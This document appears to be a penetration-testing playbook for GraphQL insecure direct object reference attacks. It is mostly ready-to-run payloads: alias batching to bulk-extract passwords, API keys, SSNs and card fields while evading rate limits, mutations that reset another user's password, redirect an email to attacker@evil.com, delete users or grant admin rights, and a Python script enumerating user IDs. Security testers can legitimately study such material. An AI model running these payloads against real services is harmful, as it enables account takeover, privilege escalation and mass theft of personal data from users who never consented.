# GraphQL IDOR + Mass Enumeration via Aliases

## When this applies

- Schema exposes resolvers like `getUser(id: Int)` that lack per-object authorization.
- You want to bulk-extract sensitive fields (password, apiKey, role) for many user IDs in a single request.
- Mutation IDOR — `UpdatePassword(username: ...)` lacks ownership checks.

## Technique

Use GraphQL aliases to issue 100+ identical queries with different IDs in a single HTTP request. Bypasses naive per-request rate limits and is faster than serial enumeration.

## Steps

### Single user query

```graphql
query {
  getUser(id: 1) {
    id
    username
    email
    password
    role
    apiKey
    secretKey
  }
}
```

### Batch enumeration with aliases

```graphql
query {
  user1: getUser(id: 1) { username password email role }
  user2: getUser(id: 2) { username password email role }
  user3: getUser(id: 3) { username password email role }
  user4: getUser(id: 4) { username password email role }
  user5: getUser(id: 5) { username password email role }
  user6: getUser(id: 6) { username password email role }
  user7: getUser(id: 7) { username password email role }
  user8: getUser(id: 8) { username password email role }
  user9: getUser(id: 9) { username password email role }
  user10: getUser(id: 10) { username password email role }
}
```

### GUID/UUID enumeration

```graphql
query {
  getUser(id: "550e8400-e29b-41d4-a716-446655440000") {
    username
    email
  }
}
```

### Alternative field names — try several resolvers

```graphql
query {
  user(id: 1) { username }
  getUserById(id: 1) { username }
  findUser(id: 1) { username }
  fetchUser(id: 1) { username }
}
```

### Mutation IDOR (Write Operations on Other Users)

Mutations often lack per-object authorization — the resolver trusts the `username`/`id` argument without checking if the caller owns it:

```graphql
# Change another user's password (no ownership check)
mutation {
  UpdatePassword(username: "admin", password: "hacked123") {
    message
  }
}

# Modify another user's profile
mutation {
  updateProfile(userId: 1, input: {email: "attacker@evil.com"}) {
    success
  }
}

# Delete another user's resource
mutation {
  deleteNote(noteId: 42) {
    success
  }
}
```

**Testing checklist:**
1. Introspect ALL mutations — look for username/id/email arguments
2. Test each mutation with another user's identifier while authenticated as yourself
3. Try both sequential IDs and usernames from enumerated user lists
4. Check if mutations validate caller identity vs the target object

### Information disclosure — sensitive fields

```graphql
query {
  getUser(id: 1) {
    id
    username
    email
    password
    passwordHash
    apiKey
    apiSecret
    secretKey
    accessToken
    refreshToken
    privateKey
    ssn
    creditCard
    bankAccount
    salary
    dateOfBirth
    address
    phoneNumber
    role
    permissions
    isAdmin
    isSuperuser
  }
}

# Hidden blog post access
query {
  getBlogPost(id: 3) {
    id
    title
    content
    postPassword
    secretData
    adminNotes
    privateContent
    isDraft
    isHidden
  }
}
```

### Deletion & modification — mutation IDOR

```graphql
# Delete user
mutation {
  deleteUser(id: 3) {
    success
    deletedId
  }
}

# Alternative deletion syntax
mutation {
  deleteOrganizationUser(input: {id: 3}) {
    user {
      id
      username
    }
  }
}

# Update user role
mutation {
  updateUser(id: 2, input: {role: "admin"}) {
    id
    role
  }
}

# Modify sensitive data
mutation {
  updateUser(id: 1, input: {password: "hacked", isAdmin: true}) {
    id
    username
    role
  }
}
```

### Python IDOR enumeration

```python
import requests
import json

url = "https://target.com/graphql"
headers = {"Content-Type": "application/json"}

for user_id in range(1, 101):
    query = {
        "query": f"query{{getUser(id:{user_id}){{id username email}}}}"
    }

    response = requests.post(url, json=query, headers=headers)
    data = response.json()

    if "data" in data and data["data"]["getUser"]:
        user = data["data"]["getUser"]
        print(f"[+] User {user['id']}: {user['username']} ({user['email']})")
```

## Verifying success

- Each aliased response carries another user's data (username, email, role).
- Sensitive fields populate (`password` non-null) — confirms field-level authorization is missing.
- Mutation IDOR lands — the target user's password / role changes per the mutation.

## Common pitfalls

- Some apps cap aliases per request — drop to 50 or 20 and retry.
- A field returning `null` may indicate field-level authz (try a different field, e.g., `id` or `username` only).
- Some mutations require additional context fields (CSRF tokens, capability tokens) — read the schema args carefully.

## Tools

- Burp Suite Repeater
- Burp InQL Scanner BApp
- Burp Autorize (compare across roles)
- Python `requests`
- graphql-cop
